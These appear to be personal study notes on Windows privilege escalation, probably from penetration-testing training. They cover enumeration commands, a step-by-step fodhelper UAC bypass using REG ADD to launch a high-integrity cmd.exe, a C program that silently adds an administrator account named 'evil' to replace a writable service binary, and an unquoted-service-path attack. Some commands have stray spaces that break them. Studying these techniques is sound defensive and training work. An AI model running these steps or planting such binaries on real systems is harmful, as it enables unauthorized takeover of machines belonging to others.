# Priv Esc for Windows


### Users  
`whoami`  
To discover other users: `net user`  
To gain info on other users: `net user <username>` 


### Hostname
Hostname provides functional roles: `hostname`

### OS Version and Architecture
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`

### Running Processes
`tasklist /SVC`

###  Network Info 
In need to pivot or find other hidden networks: `ipconfig /all` 
Check routing tables: `route print`
Active TCP network connections with address and PID: `netstat -ano`
Firwall status and rules: `netsh advfirewall show currentprofile`
If firewall profile is active, we can list the rules: `netsh advfirewall firewall show rule name=all`

### Scheduled tasks
`schtasks /query /fo LIST /v`


### Installed Apps and Patch 
Package  manager = wmic `wmic product get name, version, vendor` 
Check if it has been updated recently: `wmic qfe get Caption, Description, HotFixID, InstalledOn` 

### Insecure File permissions
`accesschk.exe -uws "Everyone" "C:\Program Files"`


### Unmounted Disks
`mountvol`

### Device Drivers and kernel modules

**Using powershell**  
`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis play Name’, ‘Start Mode’, Path`
Load VMware drivers with specific versions and then search for exploits:
`Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`

### Find Binaries that autoelevate (SUID bit equivalent)
Need to check for `AlwaysInstallElevated` registry setting
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

### Automated
`windows-privesc-check` script by pentestmonkey

___________________________________________________
# Knowledge
User inspection access tokens indicate their privilege on the system

### Integrity Levels
The configured integrity level dictates what actions an application can perform, including the ability to read from or write to the local file system.

**From Win Vista Onwards:**
• System integrity process: SYSTEM rights 
• High integrity process: administrative rights 
• Medium integrity process: standard user rights 
• Low integrity process: very restricted rights often used in sandboxed processes  
**Example:** An administrator cannot change its password on a regular shell since that is medium integrity level. When that shell is ran as high integrity level, they can make the password change  

### User account control (UAC)
Tasks run in non admin until an admin authorizes priv access
Blocks changes to system wide settings by default. Purpose is so app cant do system wide impact silently, it has to ask for privs


### UAC Bypass
1. Run `C:\Windows\System32\fodhelper.exe`
2. To get info about its integrity levels and perms required to run process, will inspect **application manifest** (xml file that lets os know how to handle program)
3. Inspect manifest with sigcheck utility from sysinternals whe -a argument to obtain extended information and -m to dump the manifest. `C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System3 2\fodhelper.exe`
Results show that app needs full admin privs and autoelevate is true which allows the executable to auto-elevate to high integrity without prompting the administrator user for consent
4. Use process monitor `procmon.exe` to monitor activities performed by target process `fodhelper.exe`
5. Check if fodhelper is trying to access a registry key that does not exist. Add a “Result” filter for “NAME NOT FOUND"
fodhelper tries to access `HKCU:\Software\Classes\ms-settings\shell\open\command` registry key, which does not appear to exist.
fodhelper tries to access the ms-setting registry key within the HKCU hive first. This key does not exist in HKCU, but we should have the necessary permissions to create it.
6. `C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`
7. The value by default is set to null which means it doesn't do anything. We can change it and launch cmd.exe
8. ` REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`
 `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
9. Now if we launch fodhelper, we should be presented with a shell with high integrity


### Insecure File Permissions
1. Get runnning services in PS  `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
2. After getting the process, run icacls to check for permissions it will output the service’s Security Identifier
`icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`     
`BUILTIN\Users:(I)(F)`
3. If it has read/write permissions than it can be replaced by one of our own

**Code example**
```
#include int main () { 
int i;
i = system ("net user evil Ev!lpass /add"); 
i = system ("net localgroup administrators evil /add");
return 0; }
```
**Cross compile**
`i686-w64-mingw32-gcc adduser.c -o adduser.exe`

Transfer to windows machine and then move to original location

> If you cannot stop the service due to lack of admin permissions, check if restarts on boot and reboot the system


### Leveraging Unquoted Service Paths
When a path is unqouted, windows will search each interpreted location.
**Example**
If the unqouted path is `C:\Program Files\My Program\My Service\service.exe`, then we can place a file in any of these as it searches through each location for it
```
C:\Program.exe 
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
```
Create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and name it so that it also matches the interpreted filename.


### Driver and kernel
Before locating native kernel vulnerabilities for older OS's it is always safer to try easier methods. Always search for third party drivers and check searchsploit

Once there is an exploit, learn to compile code on windows.
